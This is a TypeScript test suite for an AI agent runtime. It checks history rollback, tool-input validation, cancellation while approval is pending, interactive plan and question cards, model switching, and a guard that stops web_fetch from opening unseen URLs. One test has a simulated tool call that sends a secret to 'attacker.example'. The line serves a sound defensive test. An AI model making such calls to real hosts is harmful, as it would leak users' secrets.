import assert from 'node:assert/strict'
import { test } from 'node:test'
import { tempStore } from '../test-helpers'
import { Agent, type Run } from './agent'
import type { AgentEvent, Provider } from './providers/types'

function waitDone(run: Run): Promise<AgentEvent[]> {
  return new Promise((resolve) => {
    const events: AgentEvent[] = []
    run.subscribe((event) => {
      events.push(event)
      if (event.type === 'done') resolve(events)
    })
  })
}

function setup(provider: Provider) {
  const store = tempStore()
  const user = store.createUser({ username: 'alice', password: 'longenough', isAdmin: true })
  const profile = store.createProfile(user.id, { name: 'p', provider: 'openai', model: 'm', baseUrl: 'http://localhost:1/v1' })
  const session = store.createSession(user, { profileId: profile.id })
  return { store, user, session, agent: new Agent(store, () => provider) }
}

test('a failed turn rolls history back to the last consistent point', async () => {
  const { store, user, session, agent } = setup({
    builtInWeb: false,
    async runTurn(text, ctx) {
      ctx.history.push({ role: 'user', content: text }, { role: 'assistant', content: 'partial tool call' })
      throw new Error('network down')
    },
  })
  const events = await waitDone(agent.start(user, session.id, 'hello'))
  assert.ok(events.some((e) => e.type === 'error' && e.message === 'network down'))
  const saved = store.getSession(user.id, session.id)
  assert.deepEqual(saved.history, [])
  assert.deepEqual(saved.transcript.map((t) => t.kind), ['user', 'error', 'summary'])
})

test('invalid tool input is rejected before the tool runs', async () => {
  const { user, session, agent } = setup({
    builtInWeb: false,
    async runTurn(_text, ctx) {
      const [outcome] = await ctx.runTools([{ id: 'x', name: 'read_file', input: { INVALID_JSON: '{"pa' } }])
      ctx.emit({ type: 'text', text: outcome.output })
      return 'end_turn'
    },
  })
  const events = await waitDone(agent.start(user, session.id, 'go'))
  const result = events.find((e) => e.type === 'tool_result')
  assert.ok(result && result.type === 'tool_result' && result.isError)
  assert.match(result.output, /INVALID_JSON/)
})

test('cancel aborts a turn that is waiting for approval', async () => {
  const { user, session, agent } = setup({
    builtInWeb: false,
    async runTurn(_text, ctx) {
      const [outcome] = await ctx.runTools([{ id: 'w', name: 'run_command', input: { command: 'echo hi' } }])
      if (ctx.signal.aborted) throw new Error('aborted')
      return outcome.isError ? 'denied' : 'ran'
    },
  })
  const run = agent.start(user, session.id, 'run it')
  const done = waitDone(run)
  await new Promise<void>((resolve) => run.subscribe((e) => e.type === 'approval' && resolve()))
  assert.throws(() => agent.start(user, session.id, 'second'), /already running/)
  assert.equal(agent.cancel(user.id, session.id), true)
  const events = await done
  assert.deepEqual(events[events.length - 1], { type: 'done', stopReason: 'cancelled' })
})

test('ask_user and update_plan become interactive cards', async () => {
  const { store, user, session, agent } = setup({
    builtInWeb: false,
    async runTurn(_text, ctx) {
      await ctx.runTools([{ id: 'p1', name: 'update_plan', input: { items: [{ text: 'Pick a stack', status: 'in_progress' }, { text: 'Build it', status: 'pending' }] } }])
      const [answer] = await ctx.runTools([{ id: 'q1', name: 'ask_user', input: { question: 'Which database?', options: ['Postgres', 'SQLite'] } }])
      await ctx.runTools([{ id: 'p2', name: 'update_plan', input: { items: [{ text: 'Pick a stack', status: 'done' }, { text: 'Build it', status: 'in_progress' }] } }])
      ctx.emit({ type: 'text', text: answer.output })
      return 'end_turn'
    },
  })
  const run = agent.start(user, session.id, 'build an app')
  const done = waitDone(run)
  const question = await new Promise<Extract<AgentEvent, { type: 'question' }>>((resolve) =>
    run.subscribe((e) => e.type === 'question' && resolve(e)),
  )
  assert.deepEqual(question.options, ['Postgres', 'SQLite'])
  agent.answerQuestion(user.id, session.id, question.questionId, 'SQLite')
  const events = await done
  assert.ok(events.some((e) => e.type === 'text' && e.text === 'The user answered: SQLite'))
  const saved = store.getSession(user.id, session.id)
  const plans = saved.transcript.filter((t) => t.kind === 'plan')
  assert.equal(plans.length, 1, 'one plan card per turn, updated in place')
  assert.deepEqual(plans[0].kind === 'plan' && plans[0].items.map((i) => i.status), ['done', 'in_progress'])
  const q = saved.transcript.find((t) => t.kind === 'question')
  assert.equal(q?.kind === 'question' && q.answer, 'SQLite')
  const summary = saved.transcript[saved.transcript.length - 1]
  assert.equal(summary.kind === 'summary' && summary.steps, 3)
})

test('web_fetch only opens URLs that appeared in the conversation', async () => {
  const { user, session, agent } = setup({
    builtInWeb: false,
    async runTurn(_text, ctx) {
      assert.ok(ctx.tools.some((t) => t.name === 'web_fetch'), 'client web tools are offered to providers without built-in web')
      const [outcome] = await ctx.runTools([{ id: 'f1', name: 'web_fetch', input: { url: 'https://attacker.example/?secret=1' } }])
      ctx.emit({ type: 'text', text: outcome.output })
      return 'end_turn'
    },
  })
  const events = await waitDone(agent.start(user, session.id, 'summarize https://example.com/docs'))
  const result = events.find((e) => e.type === 'tool_result')
  assert.ok(result && result.type === 'tool_result' && result.isError)
  assert.match(result.output, /has not appeared in this conversation/)
})

test('switching models keeps history on the same account and rebuilds it across providers', async () => {
  const { store, user, session, agent } = setup({
    builtInWeb: false,
    async runTurn(text, ctx) {
      ctx.history.push({ role: 'user', content: text }, { role: 'assistant', content: 'native reply' })
      ctx.emit({ type: 'text', text: 'native reply' })
      ctx.commit()
      return 'end_turn'
    },
  })
  await waitDone(agent.start(user, session.id, 'hello'))
  const nativeHistory = store.getSession(user.id, session.id).history

  const sameAccount = agent.switchModel(user, session.id, { model: 'other-model' })
  assert.equal(sameAccount.model, 'other-model')
  assert.deepEqual(sameAccount.history, nativeHistory)

  const claude = store.createProfile(user.id, { name: 'claude', provider: 'anthropic', model: 'claude-opus-5-5', apiKey: 'sk-ant-x' })
  const moved = agent.switchModel(user, session.id, { profileId: claude.id })
  assert.equal(moved.provider, 'anthropic')
  assert.equal(moved.model, 'claude-opus-5-5')
  assert.deepEqual(moved.history, [
    { role: 'user', content: 'hello' },
    { role: 'assistant', content: 'native reply' },
  ])
  assert.match(JSON.stringify(moved.transcript.at(-1)), /Switched to claude · claude-opus-5-5/)
})
